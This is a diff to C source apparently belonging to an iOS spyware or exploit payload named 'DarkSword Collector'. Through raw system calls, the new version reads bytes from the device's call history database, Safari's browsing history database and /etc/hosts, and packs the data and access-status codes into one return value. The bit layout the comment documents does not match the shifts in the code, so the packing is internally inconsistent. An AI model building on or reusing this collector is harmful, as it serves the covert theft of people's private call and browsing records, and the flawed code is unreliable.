@@ -1,8 +1,11 @@
 /**
- * DarkSword Collector v22 - Read CallHistory first 16 bytes via return value
- * Uses multiple calls: first call stores data, subsequent calls return chunks
- * Since we can't pass args, use a fixed approach: return 4 bytes of CallHistory
- * encoded as a single 32-bit int (bytes 0-3)
+ * DarkSword Collector v23 - Read 1 byte each from 3 files
+ * bits 0-7: CallHistory byte
+ * bits 8-15: Safari byte  
+ * bits 16-23: /etc/hosts byte (control)
+ * bits 24-25: CallHistory status (00=denied, 01=open_only, 11=read_ok)
+ * bits 26-27: Safari status
+ * bits 28-29: hosts status
  */
 
 static long _svc1(long n, long a) {
@@ -31,18 +34,26 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read  3
 #define SYS_close 6
 
-/* Read N bytes from a file, return first 4 as int */
-static int _read4(const char *path) {
+static int _read1(const char *path, unsigned char *out) {
     int fd = (int)_svc2(SYS_open, (long)path, 0);
-    if (fd < 0) return 0xDEAD0000;
-    unsigned char buf[16] = {0};
-    int n = (int)_svc3(SYS_read, fd, (long)buf, 16);
+    if (fd < 0) return 0;
+    int n = (int)_svc3(SYS_read, fd, (long)out, 1);
     _svc1(SYS_close, fd);
-    if (n < 4) return 0xBEEF0000 | (n & 0xFFFF);
-    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
+    return (n > 0) ? 3 : 1;
 }
 
 int ds_start(void) {
-    /* Read CallHistory first 4 bytes */
-    return _read4("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
+    unsigned char ch = 0;
+    int s;
+
+    s = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", &ch);
+    int result = (int)ch | (s << 8);
+
+    s = _read1("/var/mobile/Library/Safari/History.db", &ch);
+    result |= ((int)ch << 10) | (s << 18);
+
+    s = _read1("/etc/hosts", &ch);
+    result |= ((int)ch << 20) | (s << 28);
+
+    return result;
 }
